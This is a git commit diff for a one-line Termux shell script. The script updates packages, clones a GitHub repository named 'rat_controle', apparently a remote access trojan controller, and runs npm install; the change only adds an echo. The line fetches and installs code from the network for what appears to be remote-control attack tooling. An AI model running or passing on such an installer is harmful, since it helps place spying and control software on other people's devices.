066bf19506c759394c57611bc5a1e30e7d7bc08e
zxoman <66860395+zxoman@users.noreply.github.com>
2026-04-30 02:37:57 +0300

    Update zz.sh

--- zz.sh
+++ zz.sh
@@ -1,1 +1,1 @@
-pkg update -y && pkg upgrade -y && pkg install -y nodejs git wget && cd ~ && git clone https://github.com/zxoman/rat_controle.git && cd rat_controle && npm install
+pkg update -y && pkg upgrade -y && pkg install -y nodejs git wget && cd ~ && git clone https://github.com/zxoman/rat_controle.git && cd rat_controle && npm install && echo "done"
